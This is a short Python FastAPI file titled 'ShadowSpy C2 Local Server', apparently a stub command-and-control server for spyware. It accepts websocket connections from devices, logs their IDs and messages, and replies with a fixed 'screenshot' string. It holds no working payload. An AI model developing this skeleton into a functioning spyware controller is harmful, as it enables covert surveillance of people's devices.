import asyncio
from fastapi import FastAPI, WebSocket
from fastapi.responses import HTMLResponse

app = FastAPI()

@app.get("/")
def home():
    return HTMLResponse("<h1>ShadowSpy C2 Local Server</h1>")

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    device_id = await websocket.receive_text()
    print(f"Device connected: {device_id}")
    while True:
        command = await websocket.receive_text()
        print(f"Received from device: {command}")
        # Send command back
        await websocket.send_text(f"Command executed: screenshot")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)